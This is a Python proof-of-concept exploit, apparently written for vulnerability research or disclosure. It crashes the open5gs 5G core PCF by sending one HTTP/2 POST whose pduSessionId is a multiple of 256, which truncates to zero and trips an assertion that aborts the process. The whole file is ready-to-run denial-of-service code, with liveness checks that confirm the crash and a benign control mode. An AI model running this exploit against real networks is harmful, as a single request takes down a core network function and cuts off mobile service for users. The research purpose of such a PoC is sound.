#!/usr/bin/env python3
"""
PoC — open5gs PCF remote DoS via PDU Session Identity integer truncation.

The PCF parses `pduSessionId` as a C `int`, checks only non-zero
(src/pcf/pcf-sm.c:196), and forwards it to pcf_sess_add(..., uint8_t psi)
(src/pcf/context.c:682 @ d5d735c); the narrowing truncates any non-zero multiple
of 256 to 0, and the first statement ogs_assert(psi != 0) (context.c:611 in the
prebuilt image) then aborts the whole PCF process (SIGABRT, core dumped). A
single ~200-byte HTTP/2 POST suffices; valid values 1..255 are handled normally.

Usage
-----
    # crash the PCF (target = PCF container IP and SBI port, h2c)
    python3 pcf_pdusessionid_trunc_crash_poc.py --host 172.22.0.27 --port 7777

    # benign control (valid pduSessionId=1) — PCF must stay alive
    python3 pcf_pdusessionid_trunc_crash_poc.py --host 172.22.0.27 --port 7777 --mode control

Exit code: 0 = requested mode confirmed (crash / control); 2 = did not match.
"""
import argparse
import json
import subprocess
import sys
import time

# The SBI server is HTTP/2 cleartext (h2c, nghttp2). Plain HTTP/1.1 is rejected with
# "-903 bad client magic", so we must speak HTTP/2 with prior knowledge. curl is used
# because it does this reliably without extra Python deps.
SM_POLICIES_PATH = "/npcf-smpolicycontrol/v1/sm-policies"


def build_body(psi: int, supi: str, notif_uri: str) -> str:
    """SmPolicyContextData with the mandatory fields open5gs requires to parse:
    supi, pduSessionId, pduSessionType, dnn, notificationUri, sliceInfo(sst)."""
    return json.dumps({
        "supi": supi,
        "pduSessionId": psi,
        "pduSessionType": "IPV4",
        "dnn": "internet",
        "notificationUri": notif_uri,
        "sliceInfo": {"sst": 1, "sd": "010203"},
    })


def curl(url: str, body: str = None, method: str = "GET", timeout: int = 8):
    """Return (http_code:int|0, curl_exit:int, body_text:str)."""
    cmd = ["curl", "--http2-prior-knowledge", "-s", "-o", "/tmp/_pcf_poc_resp.txt",
           "-w", "%{http_code}", "--max-time", str(timeout), "-X", method, url]
    if body is not None:
        cmd += ["-H", "Content-Type: application/json", "-d", body]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
        code = int(p.stdout.strip() or 0)
    except Exception:
        code = 0
        p = None
    try:
        with open("/tmp/_pcf_poc_resp.txt") as f:
            resp = f.read()
    except Exception:
        resp = ""
    return code, (p.returncode if p else -1), resp


def alive(url: str) -> bool:
    """A live open5gs PCF answers GET on the collection with 400/404/405 (non-000)."""
    code, _, _ = curl(url, method="GET", timeout=5)
    return code != 0


def main():
    ap = argparse.ArgumentParser(description="open5gs PCF pduSessionId truncation crash PoC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=17777)
    ap.add_argument("--scheme", default="http")
    ap.add_argument("--psi", type=int, default=256,
                    help="pduSessionId to send (crash mode). Any non-zero multiple of 256 truncates to 0.")
    ap.add_argument("--supi", default="imsi-460091234567895")
    ap.add_argument("--notif-uri", default="http://172.23.0.7:7777/nsmf-callback/v1/sm-policies")
    ap.add_argument("--mode", choices=["crash", "control"], default="crash")
    args = ap.parse_args()

    base = f"{args.scheme}://{args.host}:{args.port}"
    url = base + SM_POLICIES_PATH

    print(f"[*] target          : {url}")
    print(f"[*] mode            : {args.mode}")

    pre = alive(url)
    print(f"[*] PCF alive (pre) : {pre}")
    if not pre:
        print("[!] PCF not reachable before trigger — aborting (is the lane up?)")
        return 2

    if args.mode == "control":
        psi = 1
        note = "valid pduSessionId=1 (no truncation) — PCF must stay alive"
    else:
        psi = args.psi
        note = f"pduSessionId={psi} -> (uint8_t){psi & 0xFF} == 0 -> ogs_assert(psi != 0) -> SIGABRT"

    body = build_body(psi, args.supi, args.notif_uri)
    print(f"[*] {note}")
    print(f"[*] POST body       : {body}")

    code, cexit, resp = curl(url, body=body, method="POST", timeout=8)
    print(f"[*] POST result     : HTTP {code} (curl exit {cexit}) resp={resp[:200]!r}")

    time.sleep(3)
    post = alive(url)
    print(f"[*] PCF alive (post): {post}")

    if args.mode == "crash":
        if not post:
            print("[+] VULNERABLE: PCF process terminated after a single crafted POST (crash confirmed).")
            return 0
        print("[-] NOT reproduced: PCF still alive after crash payload.")
        return 2
    else:  # control
        if post:
            print("[+] CONTROL OK: PCF stayed alive for a valid pduSessionId (differential confirmed).")
            return 0
        print("[-] CONTROL unexpected: PCF died on a VALID pduSessionId=1 (investigate).")
        return 2


if __name__ == "__main__":
    sys.exit(main())
